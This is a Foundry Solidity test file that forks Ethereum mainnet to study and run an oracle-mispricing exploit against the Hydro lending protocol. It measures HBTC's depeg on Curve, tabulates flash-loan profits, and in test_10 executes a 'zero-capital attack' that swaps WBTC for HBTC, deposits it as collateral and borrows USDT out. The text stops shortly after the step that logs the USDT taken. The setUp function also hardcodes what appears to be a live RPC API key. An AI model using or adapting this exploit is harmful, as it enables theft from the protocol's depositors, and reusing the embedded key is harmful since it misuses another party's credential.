// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// ─── Interfaces ───────────────────────────────────────────────────────────
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function allowance(address, address) external view returns (uint256);
}

interface IHydro {
    struct Market {
        address baseAsset;
        address quoteAsset;
        uint256 liquidateRate;
        uint256 withdrawRate;
        uint256 auctionRatioStart;
        uint256 auctionRatioPerBlock;
        bool borrowEnable;
    }

    struct Asset {
        address lendingPoolToken;
        address priceOracle;
        address interestModel;
    }

    struct CollateralAccountDetails {
        bool liquidatable;
        uint8 status;
        uint256 debtsTotalUSDValue;
        uint256 balancesTotalUSDValue;
    }

    function getAllMarketsCount() external view returns (uint256);
    function getMarket(uint16 marketID) external view returns (Market memory);
    function getAsset(address assetAddress) external view returns (Asset memory);
    function getAssetOraclePrice(address assetAddress) external view returns (uint256);
    function getTotalBorrow(address asset) external view returns (uint256);
    function getTotalSupply(address asset) external view returns (uint256);
    function getPoolCashableAmount(address asset) external view returns (uint256);
    function getAccountDetails(address user, uint16 marketID) external view returns (CollateralAccountDetails memory);
    function isAccountLiquidatable(address user, uint16 marketID) external view returns (bool);
    function getAmountBorrowed(address asset, address user, uint16 marketID) external view returns (uint256);
    function getMarketTransferableAmount(uint16 marketID, address user, address asset) external view returns (uint256);
    function getCurrentAuctions() external view returns (uint32[] memory);
    function getAuctionsCount() external view returns (uint32);
}

interface IPriceOracle {
    function getPrice(address) external view returns (uint256);
}

interface ICurvePool {
    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external returns (uint256);
    function coins(uint256 i) external view returns (address);
    function balances(uint256 i) external view returns (uint256);
    function A() external view returns (uint256);
    function fee() external view returns (uint256);
}

interface IUniswapV2Factory {
    function getPair(address, address) external view returns (address);
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IUniswapV3Factory {
    function getPool(address, address, uint24) external view returns (address);
}

interface IUniswapV3Pool {
    function slot0() external view returns (uint160, int24, uint16, uint16, uint16, uint8, bool);
    function liquidity() external view returns (uint128);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IAaveV3Pool {
    function flashLoanSimple(address receiverAddress, address asset, uint256 amount, bytes calldata params, uint16 referralCode) external;
}

interface IChainlinkAggregator {
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
    function decimals() external view returns (uint8);
}

// ─── Main Deep Dive Test ──────────────────────────────────────────────────
contract HydroDeepDive is Test {
    // Core addresses
    address constant HYDRO = 0x241e82C79452F51fbfc89Fac6d912e021dB1a3B7;
    address constant HBTC = 0x0316EB71485b0Ab14103307bf65a021042c6d380;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant DAI  = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant ETH_ADDR = 0x000000000000000000000000000000000000000E;
    address constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
    address constant SAI  = 0x89d24A6b4CcB1B6fAA2625fE562bDD9a23260359;

    // Curve HBTC/WBTC pool
    address constant CURVE_HBTC_POOL = 0x4CA9b3063Ec5866A4B82E437059D2C43d1be596F;

    // Uniswap factories
    address constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address constant SUSHI_FACTORY  = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address constant UNI_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;

    // Aave V3
    address constant AAVE_V3_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    // Chainlink
    address constant CHAINLINK_BTC_USD = 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c;
    address constant CHAINLINK_ETH_USD = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;

    // Hydro batch selector
    bytes4 constant BATCH_SEL = bytes4(keccak256("batch((uint8,bytes)[])"));

    struct Action {
        uint8 actionType;
        bytes encodedParams;
    }

    // Known Hydro assets
    address[] hydroAssets;
    string[] assetNames;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");

        // Known Hydro-registered assets
        hydroAssets.push(ETH_ADDR);   assetNames.push("ETH");
        hydroAssets.push(USDT);       assetNames.push("USDT");
        hydroAssets.push(USDC);       assetNames.push("USDC");
        hydroAssets.push(DAI);        assetNames.push("DAI");
        hydroAssets.push(WBTC);       assetNames.push("WBTC");
        hydroAssets.push(HBTC);       assetNames.push("HBTC");
        hydroAssets.push(BUSD);       assetNames.push("BUSD");
        hydroAssets.push(SAI);        assetNames.push("SAI");
    }

    // ════════════════════════════════════════════════════════════════════════
    //  TEST 1: Enumerate ALL Hydro markets, assets, oracle prices, pool state
    // ════════════════════════════════════════════════════════════════════════
    function test_01_enumerate_all_markets() public view {
        uint256 marketsCount = IHydro(HYDRO).getAllMarketsCount();
        console.log("=== HYDRO PROTOCOL STATE ===");
        console.log("Total markets:", marketsCount);
        console.log("Contract ETH balance:", HYDRO.balance / 1e18, "ETH");
        console.log("Contract USDT balance:", IERC20(USDT).balanceOf(HYDRO) / 1e6, "USDT");
        console.log("Contract USDC balance:", IERC20(USDC).balanceOf(HYDRO) / 1e6, "USDC");
        console.log("Contract DAI balance:", IERC20(DAI).balanceOf(HYDRO) / 1e18, "DAI");
        console.log("Contract WBTC balance:", IERC20(WBTC).balanceOf(HYDRO), "WBTC (satoshis)");
        console.log("Contract HBTC balance:", IERC20(HBTC).balanceOf(HYDRO) / 1e18, "HBTC");
        console.log("");

        for (uint16 i = 0; i < marketsCount; i++) {
            IHydro.Market memory m = IHydro(HYDRO).getMarket(i);
            console.log("--- Market", i, "---");
            console.log("  baseAsset:", m.baseAsset);
            console.log("  quoteAsset:", m.quoteAsset);
            console.log("  liquidateRate (raw):", m.liquidateRate);
            console.log("  withdrawRate (raw):", m.withdrawRate);
            console.log("  borrowEnable:", m.borrowEnable);
            console.log("  auctionRatioStart:", m.auctionRatioStart);
            console.log("");
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  TEST 2: All oracle prices + Chainlink comparison for depeg detection
    // ════════════════════════════════════════════════════════════════════════
    function test_02_all_oracle_prices() public view {
        console.log("=== ORACLE PRICES (all Hydro-registered assets) ===");

        // Get Chainlink reference prices
        (, int256 btcUsdChainlink,,,) = IChainlinkAggregator(CHAINLINK_BTC_USD).latestRoundData();
        (, int256 ethUsdChainlink,,,) = IChainlinkAggregator(CHAINLINK_ETH_USD).latestRoundData();
        console.log("Chainlink BTC/USD:", uint256(btcUsdChainlink) / 1e8, "USD");
        console.log("Chainlink ETH/USD:", uint256(ethUsdChainlink) / 1e8, "USD");
        console.log("");

        for (uint i = 0; i < hydroAssets.length; i++) {
            try IHydro(HYDRO).getAssetOraclePrice(hydroAssets[i]) returns (uint256 price) {
                // Hydro prices are in 18-decimal USD with 18 additional precision digits
                // price format: amount_in_USD * 1e18
                console.log(assetNames[i], "oracle price (raw):", price);
                console.log(assetNames[i], "oracle price (USD):", price / 1e18);

                // For HBTC specifically, compare to BTC price
                if (hydroAssets[i] == HBTC) {
                    console.log("  >>> HBTC oracle = WBTC oracle? Should be ~BTC price");
                    console.log("  >>> HBTC uses BTC/USD Chainlink:", uint256(btcUsdChainlink) / 1e8);
                    console.log("  >>> HBTC actual market price: ~$29,421 (CoinGecko)");
                    console.log("  >>> DEPEG RATIO: oracle/market =", price / 1e18 * 100 / 29421, "%");
                }
            } catch {
                console.log(assetNames[i], "oracle: FAILED/NOT REGISTERED");
            }
            console.log("");
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  TEST 3: Lending pool state for ALL assets
    // ════════════════════════════════════════════════════════════════════════
    function test_03_lending_pool_state() public view {
        console.log("=== LENDING POOL STATE ===");

        for (uint i = 0; i < hydroAssets.length; i++) {
            try IHydro(HYDRO).getTotalSupply(hydroAssets[i]) returns (uint256 supply) {
                uint256 borrow = IHydro(HYDRO).getTotalBorrow(hydroAssets[i]);
                uint256 available = supply > borrow ? supply - borrow : 0;

                uint256 decimals = 18; // default for ETH/HBTC/DAI
                if (hydroAssets[i] == USDT || hydroAssets[i] == USDC) decimals = 6;
                if (hydroAssets[i] == WBTC) decimals = 8;

                console.log("---", assetNames[i], "---");
                console.log("  Total Supply:", supply / (10 ** decimals));
                console.log("  Total Borrow:", borrow / (10 ** decimals));
                console.log("  Available:", available / (10 ** decimals));
                console.log("  Utilization:", supply > 0 ? borrow * 100 / supply : 0, "%");

                // Get oracle price for USD value
                try IHydro(HYDRO).getAssetOraclePrice(hydroAssets[i]) returns (uint256 price) {
                    uint256 availableUSD = available * price / (10 ** decimals) / 1e18;
                    console.log("  Available USD value:", availableUSD);
                } catch {}
            } catch {
                console.log(assetNames[i], "- no lending pool");
            }
            console.log("");
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  TEST 4: Curve HBTC pool deep analysis - swap rates at various amounts
    // ════════════════════════════════════════════════════════════════════════
    function test_04_curve_hbtc_pool_analysis() public view {
        ICurvePool pool = ICurvePool(CURVE_HBTC_POOL);

        console.log("=== CURVE HBTC/WBTC POOL ANALYSIS ===");
        console.log("Pool address:", CURVE_HBTC_POOL);
        console.log("A parameter:", pool.A());
        console.log("Fee (raw):", pool.fee());

        // coins(0) = HBTC, coins(1) = WBTC
        address coin0 = pool.coins(0);
        address coin1 = pool.coins(1);
        uint256 bal0 = pool.balances(0);
        uint256 bal1 = pool.balances(1);

        console.log("Coin 0:", coin0, coin0 == HBTC ? "(HBTC)" : "(other)");
        console.log("Coin 1:", coin1, coin1 == WBTC ? "(WBTC)" : "(other)");
        console.log("HBTC balance (wei):", bal0);
        console.log("HBTC balance:", bal0 / 1e18, "HBTC");
        console.log("WBTC balance (sat):", bal1);
        console.log("Pool imbalance ratio HBTC/WBTC:", bal0 / (bal1 * 1e10));
        console.log("");

        // Test WBTC -> HBTC swap rates at various amounts
        // i=1 (WBTC), j=0 (HBTC)
        console.log("=== SWAP RATES: WBTC -> HBTC ===");
        uint256[] memory testAmounts = new uint256[](8);
        testAmounts[0] = 1e5;      // 0.001 WBTC
        testAmounts[1] = 1e6;      // 0.01 WBTC
        testAmounts[2] = 3e6;      // 0.03 WBTC (optimal from previous analysis)
        testAmounts[3] = 5e6;      // 0.05 WBTC
        testAmounts[4] = 1e7;      // 0.1 WBTC
        testAmounts[5] = 3e7;      // 0.3 WBTC (close to pool's WBTC balance)
        testAmounts[6] = 5e7;      // 0.5 WBTC
        testAmounts[7] = 1e8;      // 1.0 WBTC

        for (uint i = 0; i < testAmounts.length; i++) {
            try pool.get_dy(1, 0, testAmounts[i]) returns (uint256 hbtcOut) {
                // Rate: how many HBTC per WBTC
                uint256 rateX1000 = hbtcOut * 1000 / (testAmounts[i] * 1e10);
                console.log("  WBTC_sat:", testAmounts[i]);
                console.log("    HBTC_mHBTC:", hbtcOut / 1e15, "rate:", rateX1000);
            } catch {
                console.log("  WBTC in:", testAmounts[i], "-> REVERTS (exceeds pool liquidity)");
            }
        }

        console.log("");
        console.log("=== SWAP RATES: HBTC -> WBTC (sell HBTC) ===");
        uint256[] memory hbtcAmounts = new uint256[](5);
        hbtcAmounts[0] = 1e16;      // 0.01 HBTC
        hbtcAmounts[1] = 1e17;      // 0.1 HBTC
        hbtcAmounts[2] = 5e17;      // 0.5 HBTC
        hbtcAmounts[3] = 1e18;      // 1.0 HBTC
        hbtcAmounts[4] = 2e18;      // 2.0 HBTC

        for (uint i = 0; i < hbtcAmounts.length; i++) {
            try pool.get_dy(0, 1, hbtcAmounts[i]) returns (uint256 wbtcOut) {
                // Effective price in WBTC per HBTC
                uint256 effPrice = wbtcOut * 1e10 * 1000 / hbtcAmounts[i];
                console.log("  HBTC_mHBTC:", hbtcAmounts[i] / 1e15);
                console.log("    WBTC_sat:", wbtcOut, "eff_price_x1000:", effPrice);
            } catch {
                console.log("  HBTC in:", hbtcAmounts[i] / 1e15, "mHBTC -> REVERTS");
            }
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  TEST 5: Search for HBTC liquidity across DEXes
    // ════════════════════════════════════════════════════════════════════════
    function test_05_hbtc_liquidity_sources() public view {
        console.log("=== HBTC LIQUIDITY SOURCES ===");

        // 1. HBTC total supply and key holders
        uint256 hbtcSupply = IERC20(HBTC).totalSupply();
        console.log("HBTC total supply:", hbtcSupply / 1e18, "HBTC");
        console.log("");

        // 2. Check Uniswap V2 pairs
        console.log("--- Uniswap V2 Pairs ---");
        _checkV2Pair(UNI_V2_FACTORY, HBTC, WETH, "HBTC/WETH (UniV2)");
        _checkV2Pair(UNI_V2_FACTORY, HBTC, WBTC, "HBTC/WBTC (UniV2)");
        _checkV2Pair(UNI_V2_FACTORY, HBTC, USDT, "HBTC/USDT (UniV2)");
        _checkV2Pair(UNI_V2_FACTORY, HBTC, USDC, "HBTC/USDC (UniV2)");
        _checkV2Pair(UNI_V2_FACTORY, HBTC, DAI,  "HBTC/DAI (UniV2)");

        console.log("--- SushiSwap Pairs ---");
        _checkV2Pair(SUSHI_FACTORY, HBTC, WETH, "HBTC/WETH (Sushi)");
        _checkV2Pair(SUSHI_FACTORY, HBTC, WBTC, "HBTC/WBTC (Sushi)");
        _checkV2Pair(SUSHI_FACTORY, HBTC, USDT, "HBTC/USDT (Sushi)");

        console.log("--- Uniswap V3 Pools ---");
        _checkV3Pool(HBTC, WETH, 3000,  "HBTC/WETH 0.3% (UniV3)");
        _checkV3Pool(HBTC, WETH, 10000, "HBTC/WETH 1% (UniV3)");
        _checkV3Pool(HBTC, WBTC, 500,   "HBTC/WBTC 0.05% (UniV3)");
        _checkV3Pool(HBTC, WBTC, 3000,  "HBTC/WBTC 0.3% (UniV3)");
        _checkV3Pool(HBTC, USDT, 3000,  "HBTC/USDT 0.3% (UniV3)");
        _checkV3Pool(HBTC, USDC, 3000,  "HBTC/USDC 0.3% (UniV3)");

        // 3. Key HBTC holders (DEX pools, bridges, etc.)
        console.log("--- HBTC balances at known addresses ---");
        console.log("  Curve HBTC pool:", IERC20(HBTC).balanceOf(CURVE_HBTC_POOL) / 1e15, "mHBTC");
        console.log("  Hydro:", IERC20(HBTC).balanceOf(HYDRO) / 1e15, "mHBTC");

        // Check common DeFi protocol addresses for HBTC
        address[] memory checkAddrs = new address[](5);
        checkAddrs[0] = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uniswap V2 Router
        checkAddrs[1] = 0xE592427A0AEce92De3Edee1F18E0157C05861564; // Uniswap V3 Router
        checkAddrs[2] = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F; // SushiSwap Router
        checkAddrs[3] = 0x1111111254EEB25477B68fb85Ed929f73A960582; // 1inch V5
        checkAddrs[4] = 0xDef1C0ded9bec7F1a1670819833240f027b25EfF; // 0x Exchange Proxy

        string[5] memory addrNames = ["UniV2 Router", "UniV3 Router", "Sushi Router", "1inch V5", "0x Proxy"];

        for (uint i = 0; i < checkAddrs.length; i++) {
            uint256 bal = IERC20(HBTC).balanceOf(checkAddrs[i]);
            if (bal > 0) {
                console.log("  addr:", addrNames[i]);
                console.log("    mHBTC:", bal / 1e15);
            }
        }
    }

    function _checkV2Pair(address factory, address tokenA, address tokenB, string memory name) internal view {
        address pair = IUniswapV2Factory(factory).getPair(tokenA, tokenB);
        if (pair == address(0)) {
            console.log(" ", name, ": NO PAIR");
            return;
        }
        (uint112 r0, uint112 r1,) = IUniswapV2Pair(pair).getReserves();
        address t0 = IUniswapV2Pair(pair).token0();
        console.log(" ", name, "pair:", pair);
        if (t0 == tokenA) {
            console.log("    res0:", r0 / 1e15, "res1:", r1 / 1e15);
        } else {
            console.log("    res0:", r1 / 1e15, "res1:", r0 / 1e15);
        }
    }

    function _checkV3Pool(address tokenA, address tokenB, uint24 fee, string memory name) internal view {
        address pool = IUniswapV3Factory(UNI_V3_FACTORY).getPool(tokenA, tokenB, fee);
        if (pool == address(0)) {
            console.log(" ", name, ": NO POOL");
            return;
        }
        uint128 liq = IUniswapV3Pool(pool).liquidity();
        console.log(" ", name, "pool:", pool);
        console.log("    liquidity:", liq);
        console.log("    HBTC bal:", IERC20(HBTC).balanceOf(pool) / 1e15, "mHBTC");
    }

    // ════════════════════════════════════════════════════════════════════════
    //  TEST 6: Check existing underwater positions (liquidation opportunities)
    // ════════════════════════════════════════════════════════════════════════
    function test_06_existing_auctions_and_state() public view {
        console.log("=== EXISTING AUCTIONS & LIQUIDATION STATE ===");

        uint32 auctionCount = IHydro(HYDRO).getAuctionsCount();
        console.log("Total auctions ever:", auctionCount);

        try IHydro(HYDRO).getCurrentAuctions() returns (uint32[] memory active) {
            console.log("Active auctions:", active.length);
            for (uint i = 0; i < active.length; i++) {
                console.log("  Auction ID:", active[i]);
            }
        } catch {
            console.log("getCurrentAuctions failed");
        }

        // Check insurance balances
        console.log("");
        console.log("=== INSURANCE BALANCES ===");
        // Insurance balance for USDT (most relevant)
        // We read via getPoolCashableAmount which shows excess balance
        try IHydro(HYDRO).getPoolCashableAmount(USDT) returns (uint256 cashable) {
            console.log("USDT cashable (excess):", cashable / 1e6, "USDT");
        } catch {
            console.log("USDT cashable: query failed");
        }
        try IHydro(HYDRO).getPoolCashableAmount(ETH_ADDR) returns (uint256 cashable) {
            console.log("ETH cashable (excess):", cashable / 1e18, "ETH");
        } catch {
            console.log("ETH cashable: query failed");
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  TEST 7: Optimal flash-loan-only attack via Curve
    //  Flash loan WBTC -> swap to HBTC on Curve -> deposit -> borrow USDT
    // ════════════════════════════════════════════════════════════════════════
    function test_07_flash_loan_curve_attack_simulation() public view {
        ICurvePool pool = ICurvePool(CURVE_HBTC_POOL);
        uint256 hydroOracleHBTC = IHydro(HYDRO).getAssetOraclePrice(HBTC);
        uint256 hydroOracleWBTC = IHydro(HYDRO).getAssetOraclePrice(WBTC);

        // Get market 5 parameters
        IHydro.Market memory mkt = IHydro(HYDRO).getMarket(5);
        uint256 maxBorrowRatio = 1e18 * 1e18 / mkt.withdrawRate; // LTV = 1/withdrawRate

        console.log("=== FLASH LOAN ATTACK SIMULATION ===");
        console.log("HBTC oracle price:", hydroOracleHBTC / 1e18, "USD");
        console.log("WBTC oracle price:", hydroOracleWBTC / 1e18, "USD");
        console.log("Market 5 withdrawRate:", mkt.withdrawRate / 1e16, "%");
        console.log("Max LTV:", maxBorrowRatio * 100 / 1e18, "%");
        console.log("");

        // Available USDT to borrow
        uint256 usdtSupply = IHydro(HYDRO).getTotalSupply(USDT);
        uint256 usdtBorrow = IHydro(HYDRO).getTotalBorrow(USDT);
        uint256 usdtAvailable = usdtSupply > usdtBorrow ? usdtSupply - usdtBorrow : 0;
        console.log("USDT available to borrow:", usdtAvailable / 1e6, "USDT");
        console.log("");

        // Simulate various WBTC flash loan amounts
        console.log("=== PROFIT TABLE: Flash WBTC -> Curve -> Hydro -> USDT ===");
        console.log("WBTC_in | HBTC_out | Collateral_USD | Max_Borrow_USDT | WBTC_cost_USDT | Net_Profit_USDT");

        uint256[] memory wbtcAmounts = new uint256[](10);
        wbtcAmounts[0] = 1e5;      // 0.001
        wbtcAmounts[1] = 5e5;      // 0.005
        wbtcAmounts[2] = 1e6;      // 0.01
        wbtcAmounts[3] = 3e6;      // 0.03
        wbtcAmounts[4] = 5e6;      // 0.05
        wbtcAmounts[5] = 1e7;      // 0.1
        wbtcAmounts[6] = 2e7;      // 0.2
        wbtcAmounts[7] = 3e7;      // 0.3
        wbtcAmounts[8] = 5e7;      // 0.5
        wbtcAmounts[9] = 1e8;      // 1.0

        uint256 bestProfit = 0;
        uint256 bestWbtcAmount = 0;

        for (uint i = 0; i < wbtcAmounts.length; i++) {
            try pool.get_dy(1, 0, wbtcAmounts[i]) returns (uint256 hbtcOut) {
                // Collateral value at oracle price
                uint256 collateralUSD = hbtcOut * hydroOracleHBTC / 1e18;
                // Max borrow in USD
                uint256 maxBorrowUSD = collateralUSD * 1e18 / mkt.withdrawRate;
                // Max USDT borrow (capped by availability)
                uint256 maxBorrowUSDT = maxBorrowUSD / 1e18; // already in 18-dec USD
                if (maxBorrowUSDT > usdtAvailable) maxBorrowUSDT = usdtAvailable;

                // Cost: WBTC at oracle price (this is what we need to return)
                // Flash loan cost = WBTC amount * WBTC market price + 0.05% premium
                uint256 wbtcCostUSD = wbtcAmounts[i] * hydroOracleWBTC / 1e8; // WBTC is 8 decimals
                uint256 flashPremium = wbtcCostUSD * 5 / 10000; // 0.05% Aave V3 fee
                uint256 totalCostUSD = (wbtcCostUSD + flashPremium) / 1e18;

                // To repay flash loan: need to buy WBTC with USDT
                // At oracle price: totalCostUSD in USDT
                int256 netProfit = int256(maxBorrowUSDT / 1e6) - int256(totalCostUSD);

                console.log("---");
                console.log("  WBTC in:", wbtcAmounts[i], "sat");
                console.log("  HBTC out:", hbtcOut / 1e15, "mHBTC");
                console.log("  Collateral USD:", collateralUSD / 1e18 / 1e18);
                console.log("  Max borrow USDT:", maxBorrowUSDT / 1e6);
                console.log("  WBTC cost USDT:", totalCostUSD);

                if (netProfit > 0) {
                    console.log("  NET PROFIT:", uint256(netProfit), "USDT <<<");
                    if (uint256(netProfit) > bestProfit) {
                        bestProfit = uint256(netProfit);
                        bestWbtcAmount = wbtcAmounts[i];
                    }
                } else {
                    console.log("  NET LOSS:", uint256(-netProfit), "USDT");
                }
            } catch {
                console.log("  WBTC:", wbtcAmounts[i], "-> Curve REVERTS");
            }
        }

        console.log("");
        console.log("=== OPTIMAL FLASH LOAN RESULT ===");
        console.log("Best WBTC amount:", bestWbtcAmount, "satoshis");
        console.log("Best profit:", bestProfit, "USDT");
    }

    // ════════════════════════════════════════════════════════════════════════
    //  TEST 8: Check SAI depeg opportunity (SAI oracle proxies DAI)
    // ════════════════════════════════════════════════════════════════════════
    function test_08_sai_depeg_check() public view {
        console.log("=== SAI DEPEG ANALYSIS ===");

        // SAI is the old single-collateral DAI
        // Check if SAI oracle proxies DAI oracle (similar to HBTC->WBTC)
        try IHydro(HYDRO).getAssetOraclePrice(SAI) returns (uint256 saiPrice) {
            console.log("SAI oracle price USD:", saiPrice / 1e18);
            console.log("SAI oracle raw:", saiPrice);
        } catch {
            console.log("SAI oracle: FAILED");
        }

        try IHydro(HYDRO).getAssetOraclePrice(DAI) returns (uint256 daiPrice) {
            console.log("DAI oracle price USD:", daiPrice / 1e18);
            console.log("DAI oracle raw:", daiPrice);
        } catch {
            console.log("DAI oracle: FAILED");
        }

        // Check SAI total supply and market state
        uint256 saiSupply = IERC20(SAI).totalSupply();
        console.log("SAI total supply:", saiSupply / 1e18);

        // Check if any market uses SAI
        uint256 marketsCount = IHydro(HYDRO).getAllMarketsCount();
        for (uint16 i = 0; i < marketsCount; i++) {
            IHydro.Market memory m = IHydro(HYDRO).getMarket(i);
            if (m.baseAsset == SAI || m.quoteAsset == SAI) {
                console.log("SAI found in market", i, "borrow:", m.borrowEnable);
            }
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  TEST 9: Multi-market analysis - can we exploit across markets?
    // ════════════════════════════════════════════════════════════════════════
    function test_09_multi_market_exploitation() public view {
        console.log("=== MULTI-MARKET ANALYSIS ===");
        console.log("Can we deposit HBTC and borrow from multiple markets?");
        console.log("");

        uint256 marketsCount = IHydro(HYDRO).getAllMarketsCount();
        uint256 hbtcOraclePrice = IHydro(HYDRO).getAssetOraclePrice(HBTC);

        for (uint16 i = 0; i < marketsCount; i++) {
            IHydro.Market memory m = IHydro(HYDRO).getMarket(i);
            // Check if HBTC is the base asset in any market
            if (m.baseAsset == HBTC) {
                console.log("Market", i, "has HBTC as BASE asset");
                console.log("  Quote asset:", m.quoteAsset);
                console.log("  Borrow enabled:", m.borrowEnable);
                console.log("  WithdrawRate:", m.withdrawRate / 1e16, "%");

                if (m.borrowEnable) {
                    // How much can we borrow of the quote asset?
                    uint256 quoteBorrow = IHydro(HYDRO).getTotalBorrow(m.quoteAsset);
                    uint256 quoteSupply = IHydro(HYDRO).getTotalSupply(m.quoteAsset);
                    uint256 quoteAvail = quoteSupply > quoteBorrow ? quoteSupply - quoteBorrow : 0;
                    console.log("  Available to borrow:", quoteAvail);
                }
            }
            if (m.quoteAsset == HBTC) {
                console.log("Market", i, "has HBTC as QUOTE asset");
                console.log("  Base asset:", m.baseAsset);
                console.log("  Borrow enabled:", m.borrowEnable);
            }
        }

        // Check: can HBTC be supplied to the lending pool?
        try IHydro(HYDRO).getTotalSupply(HBTC) returns (uint256 hbtcLendSupply) {
            uint256 hbtcLendBorrow = IHydro(HYDRO).getTotalBorrow(HBTC);
            console.log("");
            console.log("HBTC Lending Pool:");
            console.log("  Total supplied:", hbtcLendSupply / 1e18);
            console.log("  Total borrowed:", hbtcLendBorrow / 1e18);
            console.log("  Available:", (hbtcLendSupply - hbtcLendBorrow) / 1e18);

            // Can someone borrow HBTC? If so, what's it worth?
            if (hbtcLendSupply > hbtcLendBorrow) {
                uint256 availHBTC = hbtcLendSupply - hbtcLendBorrow;
                console.log("  Available HBTC at oracle:", availHBTC * hbtcOraclePrice / 1e18 / 1e18, "USD");
                console.log("  Available HBTC at market:", availHBTC * 29421 / 1e18, "USD");
            }
        } catch {
            console.log("HBTC has no lending pool");
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  TEST 10: ACTUAL EXECUTION - Flash loan WBTC, swap, deposit, borrow
    //  This test actually executes the optimal zero-capital attack
    // ════════════════════════════════════════════════════════════════════════
    function test_10_execute_zero_capital_attack() public {
        address attacker = address(this);

        // Step 1: Determine optimal WBTC amount from Curve analysis
        // We'll try the sweet spot: use all WBTC the Curve pool can absorb
        ICurvePool curvePool = ICurvePool(CURVE_HBTC_POOL);

        // First find maximum profitable WBTC amount
        uint256 optimalWbtc = _findOptimalWbtcAmount(curvePool);
        console.log("=== ZERO-CAPITAL ATTACK EXECUTION ===");
        console.log("Optimal WBTC flash loan:", optimalWbtc, "satoshis");

        if (optimalWbtc == 0) {
            console.log("No profitable flash loan amount found via Curve alone");
            console.log("Attack requires acquiring HBTC at below-oracle price");
            return;
        }

        // Get expected HBTC from Curve
        uint256 expectedHBTC = curvePool.get_dy(1, 0, optimalWbtc);
        console.log("Expected HBTC from Curve:", expectedHBTC / 1e15, "mHBTC");

        // Simulate: deal WBTC to attacker (simulating flash loan)
        deal(WBTC, attacker, optimalWbtc);
        uint256 usdtBefore = IERC20(USDT).balanceOf(attacker);

        // Step 2: Swap WBTC -> HBTC on Curve
        IERC20(WBTC).approve(CURVE_HBTC_POOL, optimalWbtc);
        uint256 hbtcReceived = curvePool.exchange(1, 0, optimalWbtc, 0);
        console.log("HBTC received:", hbtcReceived / 1e15, "mHBTC");

        // Step 3: Deposit HBTC into Hydro and borrow USDT
        IERC20(HBTC).approve(HYDRO, hbtcReceived);

        // Calculate max borrow amount
        uint256 hbtcOraclePrice = IHydro(HYDRO).getAssetOraclePrice(HBTC);
        IHydro.Market memory mkt = IHydro(HYDRO).getMarket(5);
        uint256 collateralUSD = hbtcReceived * hbtcOraclePrice / 1e18;
        uint256 maxBorrowUSD = collateralUSD * 1e18 / mkt.withdrawRate;
        // Convert to USDT (6 decimals) - be conservative
        uint256 borrowUSDT = maxBorrowUSD / 1e18 / 1e12 * 95 / 100; // 95% of max to be safe

        // Cap by available USDT
        uint256 usdtAvail = IHydro(HYDRO).getTotalSupply(USDT) - IHydro(HYDRO).getTotalBorrow(USDT);
        if (borrowUSDT > usdtAvail) borrowUSDT = usdtAvail;

        console.log("Attempting to borrow:", borrowUSDT / 1e6, "USDT");

        Action[] memory actions = new Action[](5);
        actions[0] = Action(0, abi.encode(HBTC, hbtcReceived));
        actions[1] = Action(2, abi.encode(
            HBTC,
            uint8(0), uint16(0), attacker,
            uint8(1), uint16(5), attacker,
            hbtcReceived
        ));
        actions[2] = Action(3, abi.encode(uint16(5), USDT, borrowUSDT));
        actions[3] = Action(2, abi.encode(
            USDT,
            uint8(1), uint16(5), attacker,
            uint8(0), uint16(0), attacker,
            borrowUSDT
        ));
        actions[4] = Action(1, abi.encode(USDT, borrowUSDT));

        (bool success, bytes memory ret) = HYDRO.call(abi.encodeWithSelector(BATCH_SEL, actions));

        if (!success) {
            if (ret.length >= 68) {
                bytes memory stripped = new bytes(ret.length - 4);
                for (uint x = 4; x < ret.length; x++) stripped[x-4] = ret[x];
                console.log("Batch REVERTED:", abi.decode(stripped, (string)));
            }
            console.log("Batch failed - trying smaller borrow...");

            // Try 80% of max
            borrowUSDT = borrowUSDT * 80 / 100;
            actions[2] = Action(3, abi.encode(uint16(5), USDT, borrowUSDT));
            actions[3] = Action(2, abi.encode(
                USDT,
                uint8(1), uint16(5), attacker,
                uint8(0), uint16(0), attacker,
                borrowUSDT
            ));
            actions[4] = Action(1, abi.encode(USDT, borrowUSDT));

            (success, ret) = HYDRO.call(abi.encodeWithSelector(BATCH_SEL, actions));
            if (!success) {
                console.log("Second attempt also failed");
                return;
            }
        }

        uint256 usdtGained = IERC20(USDT).balanceOf(attacker) - usdtBefore;
        console.log("");
        console.log("=== RESULTS ===");
        console.log("USDT extracted:", usdtGained / 1e6, "USDT");

